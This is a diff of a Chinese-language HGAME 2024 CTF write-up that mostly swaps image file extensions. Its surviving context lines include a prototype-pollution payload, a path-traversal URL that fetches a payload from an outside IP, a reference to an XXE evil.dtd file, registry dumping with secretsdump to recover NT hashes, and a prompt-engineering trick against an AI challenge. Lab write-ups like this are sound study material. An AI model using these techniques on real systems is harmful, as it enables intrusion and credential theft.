@@ -101,9 +101,9 @@ Payload：
 {"constructor":{"prototype":{"127.0.0.1":true}}}
 ```
 
-![](./RbgJbk5SHouqYNxF9RQcfbEcnvb.png)
+![](./RbgJbk5SHouqYNxF9RQcfbEcnvb.webp)
 
-![](./OZwqbzADEogOkVxSokFccqG3nFf.png)
+![](./OZwqbzADEogOkVxSokFccqG3nFf.webp)
 
 `hgame{b57165d48c0b9f8d28e94b33607405481f815a05}`
 
@@ -198,7 +198,7 @@ PS D:\Workspace\rev\hgame_2024\week_3>
 
 观察数据库的创建过程，我们发现Admin用户始终处于表的最前列。那么假如我们能构造出`SELECT * FROM ... WHERE TRUE LIMIT 1`这样的查询，就可以获得关于Admin的所有信息，包括密码。那么我们只需要绕过前端对username和token的判空就可以获取Admin的信息。
 
-![](assets\posts/LXSoboE5ioHiQ7x64Scc4GK1nQb.png)
+![](./LXSoboE5ioHiQ7x64Scc4GK1nQb.webp)
 
 成功登录后发现一个ZIP上传并解压功能。同时存在一个API `/api/secret`从`/app/secret`文件中读取一个路径并将该路径指向的文件内容输出。
 
@@ -419,9 +419,9 @@ evil.dtd：
 
 `http://[ENDPOINT_HOST]:[ENDPOINT_PORT]/backdoor?fname=..%2f..%2f47.97.73.62%2fpayload`
 
-![](./HTIZb6iClof0VjxfvWOcRtCXnNe.png)
+![](./HTIZb6iClof0VjxfvWOcRtCXnNe.webp)
 
-![](./ZGZwbOP0Sokpf4xZTOFcsryFn0c.png)
+![](./ZGZwbOP0Sokpf4xZTOFcsryFn0c.webp)
 
 `hgame{3bac002aeec84cfe1483e8c6ece5a14d5405465b}`
 
@@ -769,7 +769,7 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
 
 考虑 glibc 提供的 init 和 fini 函数指针数组中存在代码。
 
-![](./HMXUbsgdtoIxwTxUOjtcrODpnjh.png)
+![](./HMXUbsgdtoIxwTxUOjtcrODpnjh.webp)
 
 ```c
 void __fastcall fun_init_1()
@@ -1635,7 +1635,7 @@ for i in range(1, n + 2):
 
 基础 prompt engineering。
 
-![](./V70BbanB7oJ0qQx5Q8kcO1Byntf.png)
+![](./V70BbanB7oJ0qQx5Q8kcO1Byntf.webp)
 
 `hgame{Is_this_a_ai?}`
 
@@ -1651,7 +1651,7 @@ for i in range(1, n + 2):
 
 然后取每组的最小值即可。
 
-![](./KDcWb7mdyou8UVxGYGYcAQI4n6d.png)
+![](./KDcWb7mdyou8UVxGYGYcAQI4n6d.webp)
 
 <https://cyberchef.org/#recipe=From_Decimal('Line%20feed',false)Reverse('Character')&input=MTI1CjEwMgo1MAoxMDIKOTcKNTYKNTAKNTcKNTMKOTkKNTYKNTEKMTAwCjQ1CjU0Cjk5Cjk3Cjk4CjQ1CjU2CjU3CjEwMQo1Mgo0NQo1Mwo1MAo1NQo0OQo0NQo1NQoxMDEKMTAyCjk3Cjk4Cjk3Cjk4Cjk5CjEyMwoxMDMKOTcKMTA4CjEwMgo0NA>
 
@@ -1671,7 +1671,7 @@ for i in range(1, n + 2):
 
 Mount，dump 出注册表文件，然后使用 impacket-secretsdump 即可获取 NT Hash。
 
-![](./QSoXbU6PjoxNtmxCGayc58rkniU.png)
+![](./QSoXbU6PjoxNtmxCGayc58rkniU.webp)
 
 ```plain-text
 ┌──(kali㉿kali)-[~]
@@ -1695,7 +1695,7 @@ SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:f9a0ee136422ce87371cf1666
 
 查找在线数据库可得到原文。
 
-![](./MY5Gbaox3oB7nxxXBdBcPuCznmb.png)
+![](./MY5Gbaox3oB7nxxXBdBcPuCznmb.webp)
 
 NT hash 转大写拼接即可。
 
@@ -1712,15 +1712,15 @@ NT hash 转大写拼接即可。
 
 上一题中的用户桌面上存在一个图片：
 
-![](./EaU7bDi9coxU35xPHLGcl6CCneg.png)
+![](./EaU7bDi9coxU35xPHLGcl6CCneg.webp)
 
 OCR 得到 key。
 
-![](./BvgJbTgWSoYzrVxG2O6c2Hg5n8f.png)
+![](./BvgJbTgWSoYzrVxG2O6c2Hg5n8f.webp)
 
 `968fJD17UBzZG6e3yjF6`
 
-![](./VBQ8b5Lmmo8SbRxxTTrcOSlRnrb.png)
+![](./VBQ8b5Lmmo8SbRxxTTrcOSlRnrb.webp)
 
 ```plain-text
 PS D:\Workspace\rev\hgame_2024\week_3\vera> dir W:\
